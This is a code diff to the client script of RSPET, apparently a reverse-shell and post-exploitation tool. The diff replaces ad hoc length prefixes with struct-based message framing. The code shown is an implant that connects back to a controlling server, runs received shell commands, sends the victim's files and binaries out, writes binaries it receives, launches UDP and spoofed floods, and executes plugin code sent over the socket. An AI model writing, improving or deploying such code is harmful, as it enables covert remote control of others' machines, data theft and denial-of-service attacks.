@@ -3,6 +3,7 @@
 """rspet_client.py: RSPET's Client-side script."""
 from sys import exit as sysexit
 from sys import argv, modules
+import struct
 from time import sleep
 from subprocess import Popen, PIPE
 from multiprocessing import Process, freeze_support
@@ -31,20 +32,6 @@ def sys_info():
     import platform
     sys_info_tup = platform.uname()
     return (sys_info_tup[0], sys_info_tup[1])
-
-
-def get_len(in_string, max_len):
-    """Calculate string length, return as a string with trailing 0s.
-
-    Keyword argument(s):
-    in_string -- input string
-    max_len   -- length of returned string
-    """
-    tmp_str = str(len(in_string))
-    len_to_return = tmp_str
-    for _ in range(max_len - len(tmp_str)):
-        len_to_return = '0' + len_to_return
-    return len_to_return
 
 
 def udp_flood_start(target_ip, target_port, msg):
@@ -101,7 +88,6 @@ class Client(object):
     thread_lock = Lock()
 
     def __init__(self, addr, port=9000):
-        # self.pipe = None
         self.address = addr
         self.port = int(port)
         self.update_avail = False
@@ -141,7 +127,7 @@ class Client(object):
     def loop(self):
         """Client's main body. Accept and execute commands."""
         while not Client.quit_signal and not self.update_avail:
-            en_data = self.receive(5)
+            en_data = self.receive()
             try:
                 en_data = self.comm_dict[en_data]
             except KeyError:
@@ -162,25 +148,16 @@ class Client(object):
             if not Client.updated:
                 Client.sock.connect((self.address, self.port))
             ### Send Version ###
-            # len is 2-digit (i.e. up to 99 chars)
-            msg_len = get_len(self.version, 2)
-            en_stdout = self.send(msg_len)
             en_stdout = self.send(self.version)
             ####################
             if not Client.updated:
                 sys_type, sys_hname = sys_info()
                 ### Send System Type ###
-                # len is 2-digit (i.e. up to 99 chars)
-                msg_len = get_len(sys_type, 2)
-                en_stdout = self.send(msg_len)
                 en_stdout = self.send(sys_type)
                 ########################
                 ### Send Hostname ###
                 if sys_hname == "":
                     sys_hname = "None"
-                # len is 2-digit (i.e. up to 99 chars)
-                msg_len = get_len(sys_hname, 2)
-                en_stdout = self.send(msg_len)
                 en_stdout = self.send(sys_hname)
                 #####################
         except sock_error, ValueError:
@@ -204,6 +181,7 @@ class Client(object):
     def send(self, data):
         """Send data to Server."""
         r_code = 0
+        data = struct.pack('>I', len(data)) + data
         try:
             with self.thread_lock:
                 self.sock.send(data)
@@ -212,13 +190,26 @@ class Client(object):
             self.reconnect()
         return r_code
 
-    def receive(self, size):
+    def receive(self):
         """Receive data from Server."""
         with self.thread_lock:
-            data = self.sock.recv(size)
-        if data == '':
+            raw_msglen = self.recv_helper(4)
+            if not raw_msglen:
+                return None
+            msglen = struct.unpack('>I', raw_msglen)[0]
+            # Read the message data
+            data = self.recv_helper(msglen)
+        if not data:
             self.reconnect()
-            raise sock_error
+        return data
+
+    def recv_helper(self, n):
+        data = b''
+        while len(data) < n:
+            packet = self.sock.recv(n - len(data))
+            if not packet:
+                return None
+            data += packet
         return data
 
     def kill_me(self):
@@ -231,8 +222,7 @@ class Client(object):
     def run_cm(self):
         """Get command to run from server, execute it and send results back."""
         import select
-        command_size = self.receive(13)
-        command = self.receive(int(command_size))
+        command = self.receive()
         last_stdout = None
         stdout = ""
         comm = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
@@ -240,7 +230,7 @@ class Client(object):
         while (not killed and (comm.returncode is None or last_stdout != '')):
             ready = select.select([self.sock, comm.stdout], [], [])[0][0]
             if isinstance(ready, ssl.SSLSocket):
-                en_data = self.receive(5)
+                en_data = self.receive()
                 try:
                     en_data = self.comm_dict[en_data]
                 except KeyError:
@@ -257,15 +247,12 @@ class Client(object):
             comm.terminate()
         if not stdout:
             stdout = "None"
-        len_send = get_len(stdout, 13)
-        en_stdout = self.send(len_send)
         en_stdout = self.send(stdout)
         return 0
 
     def run_plugin_cm(self):
         """Exeute command defined in a plugin."""
-        en_data = self.receive(3)  # Plugin command name up to 999 chars
-        command = self.receive(int(en_data))
+        command = self.receive()
         args = []
 
         # TODO: Decide if args are handled centrally or by local handler.
@@ -281,8 +268,7 @@ class Client(object):
     def get_file(self):
         """Get file name and contents from server, create file."""
         exit_code = 0
-        fname_length = self.receive(3)  # Filename length up to 999 chars
-        fname = self.receive(int(fname_length))
+        fname = self.receive()
         try:
             file_to_write = open(fname, 'w')
             stdout = 'fcs'
@@ -293,9 +279,7 @@ class Client(object):
         else:
             en_stdout = self.send(stdout)
             if en_stdout == 0:
-                # File size up to 9999999999999 chars
-                f_size = self.receive(13)
-                en_data = self.receive(int(f_size))
+                en_data = self.receive()
                 file_to_write.write(en_data)
                 file_to_write.close()
                 stdout = "fsw"
@@ -307,8 +291,7 @@ class Client(object):
     def get_binary(self):
         """Get binary name and contents from server, create binary."""
         exit_code = 0
-        bname_length = self.receive(3)  # Filename length up to 999 chars
-        bname = self.receive(int(bname_length))
+        bname = self.receive()
         try:
             bin_to_write = open(bname, 'wb')
             stdout = 'fcs'
@@ -319,9 +302,7 @@ class Client(object):
         else:
             en_stdout = self.send(stdout)
             if en_stdout == 0:
-                # Binary size up to 9999999999999 symbols
-                b_size = self.receive(13)
-                en_data = self.receive(int(b_size))
+                en_data = self.receive()
                 bin_to_write.write(en_data)
                 bin_to_write.close()
                 stdout = "fsw"
@@ -333,8 +314,7 @@ class Client(object):
     def send_file(self):
         """Get file name from server, send contents back."""
         exit_code = 0
-        fname_length = self.receive(3)  # Filename length up to 999 chars
-        fname = self.receive(int(fname_length))
+        fname = self.receive()
         try:
             file_to_send = open(fname, 'r')
             stdout = 'fos'
@@ -347,11 +327,8 @@ class Client(object):
             if en_stdout == 0:
                 file_cont = file_to_send.read()
                 file_to_send.close()
-                stdout = get_len(file_cont, 13)
+                stdout = file_cont
                 en_stdout = self.send(stdout)
-                if en_stdout == 0:
-                    stdout = file_cont
-                    en_stdout = self.send(stdout)
             else:
                 file_to_send.close()
         return exit_code
@@ -359,8 +336,7 @@ class Client(object):
     def send_binary(self):
         """Get binary name from server, send contents back."""
         exit_code = 0
-        bname_length = self.receive(3)  # Filename length up to 999 chars
-        bname = self.receive(int(bname_length))
+        bname = self.receive()
         try:
             bin_to_send = open(bname, 'rb')
             stdout = 'fos'
@@ -373,11 +349,7 @@ class Client(object):
             if en_stdout == 0:
                 bin_cont = bin_to_send.read()
                 bin_to_send.close()
-                stdout = get_len(bin_cont, 13)
-                en_stdout = self.send(stdout)
-                if en_stdout == 0:
-                    stdout = bin_cont
-                    en_stdout = self.send(stdout)
+                en_stdout = self.send(bin_cont)
             else:
                 bin_to_send.close()
         return exit_code
@@ -386,8 +358,7 @@ class Client(object):
         """
         Get target ip and port from server, start UPD flood wait for 'KILL'.
         """
-        en_data = self.receive(3)  # Max ip + port + payload length 999 chars
-        en_data = self.receive(int(en_data))
+        en_data = self.receive()
         en_data = en_data.split(":")
         target_ip = en_data[0]
         target_port = int(en_data[1])
@@ -399,7 +370,7 @@ class Client(object):
         proc.start()
         killed = False
         while not killed:
-            en_data = self.receive(5)
+            en_data = self.receive()
             try:
                 en_data = self.comm_dict[en_data]
             except KeyError:
@@ -414,9 +385,7 @@ class Client(object):
         Get target/spoofed ip and port from server, start UPD spoof wait for
         'KILL'.
         """
-        # Max ip + port + spoofedip + spoofed port + payload length 999 chars
-        en_data = self.receive(3)
-        en_data = self.receive(int(en_data))
+        en_data = self.receive()
         en_data = en_data.split(":")
         target_ip = en_data[0]
         target_port = int(en_data[1])
@@ -429,7 +398,7 @@ class Client(object):
         proc.start()
         killed = False
         while not killed:
-            en_data = self.receive(5)
+            en_data = self.receive()
             try:
                 en_data = self.comm_dict[en_data]
             except KeyError:
@@ -446,11 +415,9 @@ class Client(object):
         Added code licensed under MIT."""
         import imp
         # Get plugin name.
-        en_data = self.receive(3)  # Max plugin name length 999 chars
-        name = self.receive(int(en_data))
+        name = self.receive()
         # Get plugin code.
-        en_data = self.receive(13)  # Max plugin length 99999999999 chars
-        code = self.receive(int(en_data))
+        code = self.receive()
         module = imp.new_module(name)
         exec code in module.__dict__
         # Add module reference to allow unloading.
@@ -465,8 +432,7 @@ class Client(object):
 
     def unload_plugin(self):
         """Asyncronously unload a plugin."""
-        en_data = self.receive(3)  # Max plugin name length 999 chars
-        en_data = self.receive(int(en_data))
+        en_data = self.receive()
         for com in self.plugin_cmds:
             # Remove module commands.
             if en_data == self.plugin_cmds[com]["module"]:
